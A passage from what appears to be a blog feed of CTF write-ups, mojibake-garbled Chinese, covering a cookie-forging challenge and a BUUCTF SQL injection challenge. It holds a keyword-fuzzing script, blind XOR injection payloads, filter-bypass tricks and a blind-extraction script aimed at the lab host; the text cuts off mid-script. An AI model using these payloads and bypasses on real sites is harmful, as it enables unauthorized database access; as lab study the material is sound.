·éƒ½å›æ˜¾çš„æ˜¯é”™è¯¯ç•Œé¢</strong></p><p>4.æœ‰é¢˜ç›®æç¤ºå¾—ï¼Œè¿™é¢˜å’Œcookieæœ‰å…³ï¼Œæˆ‘ä»¬ç”¨BPå¯¹å…¶è¿›è¡ŒæŠ“åŒ…:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101755577.png" alt="image-20230829101755577"></p><p>æˆ‘ä»¬çŒœæµ‹å¯èƒ½è¦ä¿®æ”¹cookieçš„å€¼ï¼Œä½†æ˜¯åœ¨headersä¸­æ²¡æœ‰å‘ç°cookieå­—æ®µ</p><p>åˆæ ¹æ®é¢˜ç›®æç¤ºï¼šwe found the account cookie,çŒœæµ‹ä»–ä»¬å¯èƒ½æ˜¯ä»cookieä¸­åˆ¤æ–­å½“å‰ç”¨æˆ·çš„ç™»å½•è´¦æˆ·æ˜¯è°</p><p>æ„é€ payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:username=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102106154.png" alt="image-20230829102106154"></p><p>å‘ç°äº†flag</p><p>flag&#x3D;flag{98c976cd-ae86-46c5-b83e-8d86080798b9}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World é¢˜è§£</title>
    <link href="/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/"/>
    <url>/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>1.æ‰“å¼€ç½‘é¡µ:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828141042210.png" alt="image-20230828141042210"></p><p>å‘ç°æœ‰ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œå°è¯•å¯¹å…¶è¿›è¡Œæ³¨å…¥ï¼Œç”±é¢˜ç›®æç¤ºå¾—ï¼Œflagåœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥è¯¥æ³¨å…¥ç‚¹åº”è¯¥ä¸ºsqlæ³¨å…¥:</p><p>ä½¿ç”¨BPæµ‹è¯•è¯¥ç½‘ç«™å±äºä»€ä¹ˆè¯·æ±‚:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141849022.png" alt="image-20230828141849022"></p><p>ä½¿ç”¨è„šæœ¬åˆ¤æ–­è¯¥ç½‘ç«™è¿‡æ»¤äº†å“ªäº›å†…å®¹:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br><span class="hljs-comment">#     reponse_txt = &quot;è‡­å¼Ÿå¼Ÿ&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    payload = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: da<br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;SQL&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥ç½‘ç«™è¿‡æ»¤äº†length Length<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†handler<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†selectSeleCT <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†delete<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†oroR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†-~<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†limitLimIt<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†insertinsERTINSERT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†#<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†--+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†INFORMATION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†--<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†xor<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ANDANd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&quot;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†length <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†unionUNIonUNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&quot;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&amp;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&amp;&amp;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†||<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†oorr<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†//*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†*/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/**/<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†anandd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†GROUP<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†INTO<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†OR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORDER<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORD<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UPDATE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†AND<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†delete<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†GROUP_CONCAT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†group_concat<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†DELETE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†floor<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†rand()<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†information_schema.tables<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†LIMIT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORD<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†order <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORDER<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†OUTFILE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†updatexml<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†format<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ord<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UPDATE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†`<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†  <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†for<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†BEFORE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†sys schemma<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†SEPARATOR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†XOR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†CURSOR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†FLOOR<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141224893.png" alt="image-20230828141224893"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141251957.png" alt="image-20230828141251957"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141354341.png" alt="image-20230828141354341"></p><p>æ‰€ä»¥ç”±æµ‹è¯•å¾—è¯¥ç½‘ç«™ä¸å›æ˜¾æ•°æ®åº“ä¿¡æ¯ï¼Œåªè¿”å›trueæˆ–falseçš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é‡‡å–ç›²æ³¨</p><p>2.é€‰æ‹©ç›²æ³¨ç±»å‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¸ƒå°”ç›²æ³¨:<br>id=1 and é0(true)æˆ–id=(1)and(é0(true))<br>è¿”å›id=1çš„ç•Œé¢<br>id=1 and 0(flase)æˆ–id=(1)and(0)<br>è¿”å›id=0çš„ç•Œé¢<br><br>å¼‚æˆ–ç›²æ³¨:<br>id=1^0(false)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=1^1(true)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br>ä½¿ç”¨å¼‚æˆ–ç›²æ³¨éœ€è¦åé¢æœ‰åˆ¤æ–­è¯­å¥è¿”å›trueå’Œfalse<br><br>ç©ºå­—ç¬¦æˆ–ç›²æ³¨:<br>id=&#x27;&#x27; or é0(true)=&gt;1æˆ–id=&#x27;&#x27;or(é0(true))<br>è¿”å›id=1çš„ç•Œé¢<br>id=&#x27;&#x27; or 0(flase)=&gt;0æˆ–id=&#x27;&#x27;or(0)<br>è¿”å›id=0çš„ç•Œé¢<br></code></pre></td></tr></table></figure><p>ç”±äºandå’Œoréƒ½è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€‰æ‹©å¼‚æˆ–ç›²æ³¨</p><p>3.è·å–ç›²æ³¨trueå’Œfalseçš„ç•Œé¢</p><p>payload:</p><p>id&#x3D;0çš„ç•Œé¢</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143418789.png" alt="image-20230828143418789"></p><p>payload:</p><p>id&#x3D;1çš„ç•Œé¢</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^0<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828143453303.png" alt="image-20230828143453303"></p><p>4.çˆ†æ•°æ®åº“ä¿¡æ¯:</p><p>ç”±äºlimitè¢«é™åˆ¶,æ‰€ä»¥é•¿åº¦è§„å®šå¯ä»¥ä¸ºè‡ªç”±ï¼Œä½¿ç”¨GROUP_CONCAT()è·å–å…¨éƒ¨ä¿¡æ¯</p><p>ç¬¬ä¸€æ­¥ï¼šç›´æ¥çˆ†æ•°æ®åº“çš„åå­—:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),1,1))&gt;79)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># å¯¹æ•°æ®åº“åå­—ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œæš´åŠ›å‰–è§£</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># æ‰‹åŠ¨è§„å®šæ•°æ®åº“åå­—é•¿åº¦</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>        <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        payload2 = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>        &#125;<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.post(url=url, data=payload2)<br>        <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>        true_text = <span class="hljs-string">&quot;Error&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„ç¬¬%dä¸ªå­—ç¬¦:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># å¯¹ä¸‹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼š&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼šctftraih<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥ï¼šç”±äºç”±é¢˜ç›®æç¤ºå¾—ï¼Œflagåœ¨flagè¡¨çš„flagå­—æ®µä¸­ï¼Œæ‰€ä»¥ç›´æ¥çˆ†flagå­—æ®µä¿¡æ¯å³å¯:</p><p>selectè¢«è¿‡æ»¤çš„ç»•è¿‡æ–¹å¼:</p><p>å¤§å°å†™ç»•è¿‡æ³•:</p><p>è¯¥æ–¹æ³•é€‚ç”¨äºä»»ä½•åœ¨mysqlä¸­æ‰§è¡Œçš„å•è¯ä»£ç </p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">seleCt<br>SeLeCt<br>SELect<br>.......<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828152946191.png" alt="image-20230828152946191"></p><p>å†…è”æ³¨é‡Šç»•è¿‡:</p><p>å½“ä¸€äº›å…³é”®è¯­å¥è¢«è¿‡æ»¤æ—¶ï¼Œå†…è”æ³¨é‡Šå°±æ˜¯æŠŠä¸€äº›ç‰¹æœ‰çš„ä»…åœ¨ mysql ä¸Šçš„è¯­å¥æ”¾åœ¨ &#x2F;*!  *&#x2F;ä¸­ï¼Œè¿™æ ·è¿™äº›è¯­å¥å¦‚æœåœ¨å…¶å®ƒæ•°æ®åº“ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†åœ¨ mysql ä¸­ä¼šæ‰§è¡Œ.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/*!select*/<br>/*!sElect*/<br>.....<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828153246186.png" alt="image-20230828153246186"></p><p>ä½¿ç”¨å¤§å°å†™ç»•è¿‡æ–¹å¼æµ‹è¯•:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1seLeCt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828153509802.png" alt="image-20230828153509802"></p><p>é€šè¿‡å“åº”ç»“æœå¯çŸ¥ï¼Œå¯ä»¥ç»•è¿‡</p><p>ç”±äºgroup_concatä¹Ÿè¢«è¿‡æ»¤ï¼Œä¸”é€šè¿‡ä¸æ–­å°è¯•ï¼Œå‘ç°å¤§å°å†™éƒ½æ— æ³•ç»•è¿‡ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥çŒœæµ‹è¯¥flagå­—æ®µåªæœ‰ä¸€è¡Œå†…å®¹ï¼Œä¸”ä¸ºflagçš„å€¼</p><p>æµ‹è¯•:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828154057973.png" alt="image-20230828154057973"></p><p>åªæœ‰substrä¸­selectè¿”å›çš„åªæœ‰ä¸€è¡Œå†…å®¹æ—¶ï¼Œæ‰ä¸ä¼šå‘ç”ŸæŠ¥é”™</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((seLEct(&#123;flag&#125;)from(&#123;flag&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; 